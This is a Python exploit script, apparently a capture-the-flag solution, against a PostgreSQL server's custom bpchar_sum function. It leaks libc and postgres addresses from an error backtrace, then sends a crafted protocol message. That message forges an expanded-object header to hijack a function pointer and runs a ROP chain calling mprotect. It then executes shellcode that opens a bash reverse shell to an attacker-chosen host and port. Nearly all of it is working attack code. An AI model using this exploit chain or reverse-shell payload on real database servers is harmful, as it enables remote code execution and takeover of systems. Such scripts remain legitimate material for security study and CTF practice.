import pg8000.native
import pg8000.core as core
import ssl
from struct import pack, unpack
from pwn import flat, context, asm, remote, success, info, warning, debug, shellcraft
import time
import random
import socket

context.arch = "amd64"
context.log_level = "debug"
HOST = "" #FIXME
PORT = 32216
USER = "ctf"
PASS = "123qwe!@#QWE"
# USER = "postgres"
DATABASE = "postgres"
# CLIENT_CERT = "./client.crt"
# CLIENT_KEY = "./client.key"

RHOST = "" #FIXME
RPORT = 1234

def tob(a):
    if isinstance(a, str):
        return bytes(a,encoding="latin1")
    elif isinstance(a,bytes) or isinstance(a,bytearray):
        return a
    else:
        return bytes(str(a),encoding="latin1")

def get_raw_msg(conn: pg8000.native.Connection):
    code, data_len = core.ci_unpack(core._read(conn._sock, 5))
    result = (code, core._read(conn._sock, data_len - 4))
    debug(str(result))
    return result
def get_msg(conn: pg8000.native.Connection) -> list[tuple[bytes, bytes]]:
    code = None
    result = []
    while code != core.READY_FOR_QUERY:
        try:
            result.append(get_raw_msg(conn))
        except:
            break
        code = result[-1][0]
    return result

def query_msg(data: bytes):
    return b'\0' + data + b'\0\0\0'

def simple_query(conn: pg8000.native.Connection, data: bytes | str):
    conn._send_message(core.PARSE, query_msg(tob(data)))
    conn._send_message(core.BIND, b'\0'*8)
    conn._send_message(core.DATA_ROW, b'\x50\x00')
    conn._send_message(core.EXECUTE, b'\0'*5)
    conn._send_message(core.SYNC, b'')
    core._flush(conn._sock)
    return get_msg(conn)

def pause():
    input("pause...")

# ------------------STAGE 1 LEAK------------------
# # ignore cert
# ssl_context = ssl.create_default_context()
# # if CLIENT_CERT:
# #     ssl_context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
# ssl_context.check_hostname = False
# ssl_context.verify_mode = ssl.CERT_NONE

conn = pg8000.native.Connection(
    host=HOST, port=PORT, database=DATABASE,
    user=USER , password=PASS #, ssl_context=ssl_context
)

simple_query(conn, "set client_encoding to 'latin1';")

# pause()
# err = simple_query(conn, f"SELECT bpchar_sum(123, decode('0102030405060708', 'hex'));")[1][1].decode("latin-1")
# err = simple_query(conn, f"SELECT bpchar_sum(123, CAST(12345678123123123123 AS numeric));")[1][1].decode("latin-1")

# # struct point {
# #     float8 x, y;
# # }
# payload = flat(
#     (0x100 << 2), # varchar len, 4byte, pad to 8 byte
# ).ljust(0x10, b'\0')
# point = unpack("<dd", payload)

# err = simple_query(conn, f"SELECT bpchar_sum(NULL, point({point[0]}, {point[1]}))")[1][1].decode("latin-1")

err = simple_query(conn, f"SELECT bpchar_sum(123, 123);")[1][1].decode("latin-1")

lines = err.splitlines()

def calc_base(line: str):
    return int(line.split()[-1][1:-1], 16) - int(line.split('+')[1].split(')')[0], 16)

libc_addr = calc_base(lines[-4])
postgres_addr = calc_base(lines[2])


success(f"libc: {hex(libc_addr)}")
success(f"postgres: {hex(postgres_addr)}")
success(f"stage 1 ok")

conn.close()

# exit(0)

# ------------------STAGE 2 ATTACK------------------

# ssl_context = ssl.create_default_context()
# # if CLIENT_CERT:
# #     ssl_context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
# ssl_context.check_hostname = False
# ssl_context.verify_mode = ssl.CERT_NONE

conn = pg8000.native.Connection(
    host=HOST, port=PORT, database=DATABASE,
    user=USER, password=PASS, # ssl_context=ssl_context
)

# pause()

PqRecvBuffer = postgres_addr + 0x76D660
svcudp_reply = libc_addr + 0x145CC6
pop4_ret = libc_addr + 0x000000000002775e
leave_ret = libc_addr + 0x000000000004de39

pop_rdi_ret = libc_addr + 0x0000000000027765
pop_rsi_ret = libc_addr + 0x0000000000028f19
pop_rdx_ret = libc_addr + 0x00000000000fdcfd
pop_rcx_ret = libc_addr + 0x0000000000101e77
pop_rax_ret = libc_addr + 0x000000000003f117
syscall_ret = libc_addr + 0x0000000000086002

jmp_rsp = postgres_addr + 0x0000000000188f15

# fake_bpchar start at PqRecvBuffer+0x6

# 1. pg_detoast_datum need VARATT_IS_EXTENDED, enter heap_tuple_untoast_attr
#   fake_bpchar[0] & 0b11 != 0
# 2. heap_tuple_untoast_attr need VARATT_IS_EXTERNAL_EXPANDED, enter heap_tuple_fetch_attr
#   fake_bpchar[0] == 1 && fake_bpchar[1] & 0b11111110 == 2
# 3. heap_tuple_fetch_attr need VARATT_IS_EXTERNAL_EXPANDED, enter EOH_get_flat_size
#   fake_bpchar[1] != 1 && fake_bpchar[1] & 0b11111110 == 2
# 4. EOH_get_flat_size will call function pointer on ((*(uint64_t*)(fake_bpchar + 2)) + 8)
payload = flat({
    0x06: pack("<BB", 0x1, 0x2),
    0x08: PqRecvBuffer + 0x48,
    0x48: flat(
        0, PqRecvBuffer + 0x58
    ), # ExpandedObjectHeader
    0x58: svcudp_reply, # rdi will point to off:0x48
    0x48 + 0x28: pop4_ret,
    0x48 + 0x38: flat(
        PqRecvBuffer + 0x48 + 0x18,
        leave_ret,
        PqRecvBuffer + 0x48 + 0x20
    )
}, filler=b'\0')[6:]

# ROP chain
payload += flat(
    pop_rdi_ret, ((PqRecvBuffer >> 12) << 12),
    pop_rsi_ret, 0x3000,
    pop_rdx_ret, 7,
    pop_rax_ret, 10, # SYS_mprotect
    syscall_ret,
    jmp_rsp,
)

# reverse shell
payload += asm(shellcraft.execve("/usr/bin/bash", ["/usr/bin/bash", "-c", f"/usr/bin/bash >& /dev/tcp/{RHOST}/{RPORT} 0>&1"]))

debug(f"len: {len(payload)}")

conn._send_message(core.PARSE, query_msg(payload))
conn._send_message(core.SYNC, b'')

addr_in_ieee754 = str(unpack("<d", pack("<Q", PqRecvBuffer + 0x6))[0])
debug(f"fake_bpchar: {hex(PqRecvBuffer + 0x6)}")
debug(addr_in_ieee754)
payload = f"SELECT bpchar_sum(123, CAST ({addr_in_ieee754} AS float8));"
conn._send_message(core.PARSE, query_msg(tob(payload)))
conn._send_message(core.BIND, b'\0'*8)
conn._send_message(core.DATA_ROW, b'\x50\x00')
conn._send_message(core.EXECUTE, b'\0'*5)
conn._send_message(core.SYNC, b'')
core._flush(conn._sock)
get_msg(conn)
# get_msg(conn)
success("bounce bounce bounce")
